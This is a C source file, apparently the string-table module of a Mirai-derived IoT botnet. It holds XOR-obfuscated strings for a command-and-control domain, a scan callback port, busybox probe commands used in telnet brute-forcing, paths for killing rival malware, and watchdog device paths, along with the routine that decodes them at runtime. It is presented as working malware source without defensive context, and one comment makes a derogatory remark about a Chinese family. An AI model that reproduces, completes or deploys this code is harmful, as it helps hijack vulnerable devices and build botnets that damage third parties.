#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0xdedeffba;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
	//if u dont have a domain dont worry about it ig
    add_entry(TABLE_CNC_DOMAIN, "\x2D\x24\x2E\x24\x2C\x27\x2A\x24\x31\x2B\x20\x31\x6B\x35\x32\x45", 16);
    // 1991
    add_entry(TABLE_SCAN_CB_PORT, "\x42\x82", 2);// old port was 48101 \xFE\xA0
    // gosh that chinese family at the other table sure ate alot
    add_entry(TABLE_EXEC_SUCCESS, "\x22\x2A\x36\x2D\x65\x31\x2D\x24\x31\x65\x26\x2D\x2C\x2B\x20\x36\x20\x65\x23\x24\x28\x2C\x29\x3C\x65\x24\x31\x65\x31\x2D\x20\x65\x2A\x31\x2D\x20\x37\x65\x31\x24\x27\x29\x20\x65\x36\x30\x37\x20\x65\x24\x31\x20\x65\x24\x29\x2A\x31\x45", 58);
    // shell
    add_entry(TABLE_SCAN_SHELL, "\x36\x2D\x20\x29\x29\x45", 6);
    // enable
    add_entry(TABLE_SCAN_ENABLE, "\x20\x2B\x24\x27\x29\x20\x45", 7);
    // system
    add_entry(TABLE_SCAN_SYSTEM, "\x36\x3C\x36\x31\x20\x28\x45", 7);
    // sh
    add_entry(TABLE_SCAN_SH, "\x36\x2D\x45", 3);
    // /bin/busybox REKAI
    add_entry(TABLE_SCAN_QUERY, "\x6A\x27\x2C\x2B\x6A\x27\x30\x36\x3C\x27\x2A\x3D\x65\x17\x00\x0E\x04\x0C\x45", 19);
    // REKAI: applet not found
    add_entry(TABLE_SCAN_RESP, "\x17\x00\x0E\x04\x0C\x7F\x65\x24\x35\x35\x29\x20\x31\x65\x2B\x2A\x31\x65\x23\x2A\x30\x2B\x21\x45", 24);
    
    add_entry(TABLE_SCAN_NCORRECT, "\x2B\x26\x2A\x37\x37\x20\x26\x31\x45", 9);
    
    add_entry(TABLE_SCAN_PS, "\x6A\x27\x2C\x2B\x6A\x27\x30\x36\x3C\x27\x2A\x3D\x65\x35\x36\x45", 16);
    
    add_entry(TABLE_SCAN_KILL_9, "\x6A\x27\x2C\x2B\x6A\x27\x30\x36\x3C\x27\x2A\x3D\x65\x2E\x2C\x29\x29\x65\x68\x7C\x6A\x45", 22);
    // /proc/
    add_entry(TABLE_KILLER_PROC, "\x6A\x35\x37\x2A\x26\x6A\x45", 7);
    // /exe
    add_entry(TABLE_KILLER_EXE, "\x6A\x20\x3D\x20\x45", 5);
    // /fd
    add_entry(TABLE_KILLER_FD, "\x6A\x23\x21\x45", 4);
    // /maps
    add_entry(TABLE_KILLER_MAPS, "\x6A\x28\x24\x35\x36\x45", 6);
    // /proc/net/tcp
    add_entry(TABLE_KILLER_TCP, "\x6A\x35\x37\x2A\x26\x6A\x2B\x20\x31\x6A\x31\x26\x35\x45", 14);
    // Masuta
    add_entry(TABLE_KILLER_MASUTA, "\x74\x22\x26\x24\x27\x71\x21\x2A\x28\x76\x70\x2D\x2B\x35\x77\x29\x20\x2C\x75\x2F\x2E\x23\x45", 23);
	// UPX!
	add_entry(TABLE_KILLER_UPX, "\x10\x15\x1D\x64\x45", 5);
    // dvrHelper
    add_entry(TABLE_MAPS_MIRAI, "\x21\x33\x37\x0D\x20\x29\x35\x20\x37\x45", 10);


    // /dev/watchdog
    add_entry(TABLE_MISC_WATCHDOG, "\x6A\x21\x20\x33\x6A\x32\x24\x31\x26\x2D\x21\x2A\x22\x45", 14);
    // /dev/misc/watchdog
    add_entry(TABLE_MISC_WATCHDOG2, "\x6A\x21\x20\x33\x6A\x28\x2C\x36\x26\x6A\x32\x24\x31\x26\x2D\x21\x2A\x22\x45", 19);
	
	add_entry(TABLE_MISC_RANDSTRING, "\x24\x23\x2F\x36\x21\x2E\x23\x29\x77\x21\x2B\x32\x24\x2B\x21\x45", 16);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(!val->locked)
        {
            //printf("[table] Tried to double-unlock value %d\n", id);
            return;
        }
    #endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            //printf("[table] Tried to double-lock value\n");
            return;
        }
    #endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            //printf("[table] Tried to access table.%d but it is locked\n", id);
            return NULL;
        }
    #endif

    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;

    #ifdef DEBUG
        table[id].locked = TRUE;
    #endif
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

    #ifdef DEBUG
        val->locked = !val->locked;
    #endif
}

